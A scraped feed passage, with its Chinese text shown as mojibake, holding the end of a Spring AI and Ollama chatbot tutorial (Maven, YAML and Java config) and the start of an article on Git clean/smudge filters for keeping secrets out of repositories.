 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.22<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>

<pre><code class="hljs language-xml" lang="xml"> Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-bom<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${spring-ai.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
 Â  Â  Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
 Â  Â <span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span>
</code></pre>
<h2 data-id="heading-2">ç¼–å†™é…ç½®</h2>
<p>æœ‰2ä¸ªé…ç½®ï¼Œapplication.yml å’Œ Configuration</p>
<h3 data-id="heading-3">application.yml</h3>
<p>ä¸»è¦æ˜¯æ¨¡å‹ï¼Œè®¿é—®åœ°å€ï¼Œæ—¥å¿—è¾“å‡º;</p>
<p>1.11434 æ˜¯ Ollama é»˜è®¤ç«¯å£</p>
<p>2.model å°±æ˜¯æœ¬åœ°å¯åŠ¨çš„ AI æ¨¡å‹ï¼Œæ¨¡å‹åç§°å¤§å°å†™æ•æ„Ÿï¼Œæ³¨æ„åˆ«å†™é”™</p>
<p>3.è®¾ç½®æ—¥å¿—è¾“å‡ºçº§åˆ«ï¼Œè¿˜è¦åœ¨ Bean ä¸Šé…ç½® Advisorï¼Œè®¾ç½® level æœ€å¥½æ˜¯ç²¾ç¡®åˆ°åŒ…ï¼Œå¦åˆ™æ—¥å¿—å¤ªå¤š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
 Â <span class="hljs-attr">application:</span>
 Â  Â <span class="hljs-attr">name:</span> <span class="hljs-string">springai</span>
 Â <span class="hljs-attr">ai:</span>
 Â  Â <span class="hljs-attr">ollama:</span>
 Â  Â  Â <span class="hljs-attr">base-url:</span> <span class="hljs-string">http://localhost:11434</span>
 Â  Â  Â <span class="hljs-attr">chat:</span>
 Â  Â  Â  Â <span class="hljs-attr">model:</span> <span class="hljs-string">deepseek-r1:8b</span>
<span class="hljs-attr">logging:</span>
 Â <span class="hljs-attr">level:</span>
 Â  Â <span class="hljs-attr">org.springframework.ai.chat.client.advisor:</span> <span class="hljs-string">debug</span>
 Â  Â <span class="hljs-attr">com.pain.springai:</span> <span class="hljs-string">debug</span>
</code></pre>
<h2 data-id="heading-4">é…ç½®Configuration</h2>
<p>defaultSystemï¼šç³»ç»Ÿé…ç½®ï¼Œå¯ä»¥è®¾å®šè§’è‰²</p>
<p>defaultAdvisorï¼šæ—¥å¿—å¢å¼ºå™¨</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> org.springframework.ai.chat.client.ChatClient;
<span class="hljs-keyword">import</span> org.springframework.ai.chat.client.advisor.SimpleLoggerAdvisor;
<span class="hljs-keyword">import</span> org.springframework.ai.ollama.OllamaChatModel;
<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Configuration;
â€‹
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonConfig</span> {
â€‹
 Â  Â <span class="hljs-meta">@Bean</span>
 Â  Â <span class="hljs-keyword">public</span> ChatClient Â chatClient(OllamaChatModel model){
 Â  Â  Â  Â <span class="hljs-keyword">return</span> ChatClient.builder(model)
 Â  Â  Â  Â  Â  Â  Â   .defaultSystem(<span class="hljs-string">"ä½ æ˜¯é«˜å‚²å†·é…·çš„å¤©é“ä½©æ©ï¼Œè¯·ä»¥å¤©é“ä½©æ©çš„èº«ä»½å’Œè¯­æ°”å›ç­”é—®é¢˜"</span>)
 Â  Â  Â  Â  Â  Â  Â   .defaultAdvisors(new SimpleLoggerAdvisor())
 Â  Â  Â  Â  Â  Â  Â   .build();
 Â   }
}
</code></pre>
<h2 data-id="heading-5">ä¸šåŠ¡ä»£ç </h2>
<p>å†™ä¸€ä¸ªControllerï¼Œæ³¨å…¥ChatClientï¼Œç„¶åå°±å¯ä»¥å¯¹è¯äº†</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> lombok.RequiredArgsConstructor;
<span class="hljs-keyword">import</span> org.springframework.ai.chat.client.ChatClient;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RequestMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RestController;
<span class="hljs-keyword">import</span> reactor.core.publisher.Flux;
â€‹
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(<span class="hljs-string">"/ai"</span>)</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatController</span> {
â€‹
 Â  Â <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ChatClient chatClient;
â€‹
 Â  Â <span class="hljs-meta">@RequestMapping(<span class="hljs-string">"/chat"</span>)</span>
 Â  Â <span class="hljs-keyword">public</span> String chat(String prompt) {
 Â  Â  Â  Â <span class="hljs-keyword">return</span> chatClient.prompt()
 Â  Â  Â  Â  Â  Â  Â   .user(prompt)
 Â  Â  Â  Â  Â  Â  Â   .call()
 Â  Â  Â  Â  Â  Â  Â   .content();
 Â   }
â€‹
 Â  Â <span class="hljs-meta">@RequestMapping(value = <span class="hljs-string">"/chat/flux"</span>, produces = <span class="hljs-string">"text/html;charset=utf-8"</span>)</span>
 Â  Â <span class="hljs-keyword">public</span> Flux&lt;String&gt; fluxChat(String prompt) {
 Â  Â  Â  Â <span class="hljs-keyword">return</span> chatClient.prompt()
 Â  Â  Â  Â  Â  Â  Â   .user(prompt)
 Â  Â  Â  Â  Â  Â  Â   .stream()
 Â  Â  Â  Â  Â  Â  Â   .content();
 Â   }
}
</code></pre>
<p>é»˜è®¤æœåŠ¡å™¨çš„ç«¯å£æ˜¯8080ï¼Œæ‹¼æ¥ä¸€ä¸‹ç«¯å£è®¿é—®ï¼š<a href="https://link.juejin.cn?target=url" target="_blank" title="url" ref="nofollow noopener noreferrer">http:localhost:8080/ai/chat </a><br/>
è®¿é—®æœåŠ¡å™¨</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73521af68408461ca09b41f42cce47bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSp6YGT5L2p5oGp:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767973927&amp;x-signature=wvo2mzej%2B7X9ivNXu%2Btr4CLZzU8%3D" alt="å›¾ç‰‡" loading="lazy"/><br/>
æ—¥å¿—è¾“å‡º</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3edf7b2ae40746cd9439faca68fa6174~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSp6YGT5L2p5oGp:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767973927&amp;x-signature=G8HZukCE3%2BT9XFRtoh0MIRXhW5c%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¸‹ä¸€ç¯‡å¸¦ä½ ä»¬æ›´æ·±å…¥çš„äº†è§£SpringAIå¼ºå¤§çš„åŠŸèƒ½</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Git ä»“åº“è¿‡æ»¤æ•æ„Ÿä¿¡æ¯ï¼Œé€šè¿‡é…ç½® clean/smudge è¿‡æ»¤å™¨çš„æ–¹å¼]]></title>    <link>https://juejin.cn/post/7590654280899526699</link>    <guid>https://juejin.cn/post/7590654280899526699</guid>    <pubDate>2026-01-02T13:28:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590654280899526699" data-draft-id="7590011643297251366" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Git ä»“åº“è¿‡æ»¤æ•æ„Ÿä¿¡æ¯ï¼Œé€šè¿‡é…ç½® clean/smudge è¿‡æ»¤å™¨çš„æ–¹å¼"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,GitHub"/> <meta itemprop="datePublished" content="2026-01-02T13:28:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GentlyBeing"/> <meta itemprop="url" content="https://juejin.cn/user/543573892409056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Git ä»“åº“è¿‡æ»¤æ•æ„Ÿä¿¡æ¯ï¼Œé€šè¿‡é…ç½® clean/smudge è¿‡æ»¤å™¨çš„æ–¹å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/543573892409056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GentlyBeing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T13:28:38.000Z" title="Fri Jan 02 2026 13:28:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><hr/>
<p>æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§å›°æ‰°ï¼Ÿæœ¬åœ°é…ç½®æ–‡ä»¶é‡Œè—ç€æ•°æ®åº“å¯†ç ã€å¯†é’¥ç­‰æ•æ„Ÿä¿¡æ¯ï¼Œä¸€ä¸å°å¿ƒå°±æäº¤åˆ° Git ä»“åº“äº†ï¼Œæ—¢ä¸å®‰å…¨åˆå®¹æ˜“æ³„éœ²éšç§ã€‚</p>
<p>ä»Šå¤©å°±ç»™å¤§å®¶åˆ†äº« Git ä»“åº“è„±æ•æ–¹æ³•ï¼Œé‡ç‚¹è®²åœ¨å¼€å‘è¿‡ç¨‹ä¸­æœ€å®ç”¨çš„ã€ŒGit å†…ç½®è¿‡æ»¤å™¨ã€æ–¹æ¡ˆâ€”â€”ä¸ç”¨æ”¹ä»£ç ã€ä¸ç”¨æ‰‹åŠ¨æ”¹é…ç½®ï¼Œæäº¤è‡ªåŠ¨è„±æ•ã€æ‹‰å–è‡ªåŠ¨è¿˜åŸï¼Œå…¨ç¨‹æ— æ„Ÿæ“ä½œã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å…ˆææ‡‚æ ¸å¿ƒéœ€æ±‚ï¼šæœ¬åœ°èƒ½ç”¨ï¼Œä»“åº“å®‰å…¨</h2>
<p><strong>ç›®æ ‡</strong>å¾ˆç®€å•ï¼š</p>
<ul>
<li>æœ¬åœ°å¼€å‘æ—¶ï¼Œèƒ½ç”¨åˆ°å®Œæ•´çš„é…ç½®ï¼ˆå«æ•æ„Ÿä¿¡æ¯ï¼‰ï¼Œä¸å½±å“æ­£å¸¸å¼€å‘ï¼›</li>
<li>æäº¤åˆ° Git ä»“åº“æ—¶ï¼Œæ•æ„Ÿä¿¡æ¯è‡ªåŠ¨å˜æˆå ä½ç¬¦ï¼Œä¸ä¼šæ³„éœ²ï¼›</li>
<li>æœ€å¥½è‡ªåŠ¨åŒ–ï¼Œä¸ç”¨æ¯æ¬¡æäº¤å‰æ‰‹åŠ¨æ”¹é…ç½®ï¼Œçœäº‹ã€‚</li>
</ul>
<blockquote>
<p>ğŸ’¡<strong>æå‰åˆ’é‡ç‚¹</strong>ï¼š</p>
<p>ä¸‹é¢ 3 ç§æ–¹æ³•é‡Œï¼Œä¼˜å…ˆé€‰ã€Œæ–¹æ³• 3ï¼šGit å†…ç½®è¿‡æ»¤å™¨ã€ã€‚å‰ä¸¤ç§é€‚åˆå·²å¼€å‘å®Œçš„é¡¹ç›®ï¼Œè¿‡æ»¤å™¨æ–¹æ¡ˆé€‚åˆæ­£åœ¨å¼€å‘çš„é¡¹ç›®ï¼Œé›¶ä¾µå…¥è¿˜çœå¿ƒã€‚</p>
</blockquote>
<h3 data-id="heading-1">3 ç§è„±æ•æ–¹æ³•å¯¹æ¯”</h3>
<h4 data-id="heading-2">æ–¹æ³• 1ï¼šåˆ›å»ºé…ç½®æ¨¡æ¿æ–‡ä»¶ï¼ˆç®€å•ä½†ç¹çï¼‰</h4>
<p>æ¯”å¦‚ï¼Œæœ‰ä¸ªé…ç½®æ–‡ä»¶å« <code>settings.yaml</code>ï¼Œé‡Œé¢æœ‰æ•æ„Ÿä¿¡æ¯ã€‚åšæ³•å¾ˆç®€å•ï¼š</p>
<ol>
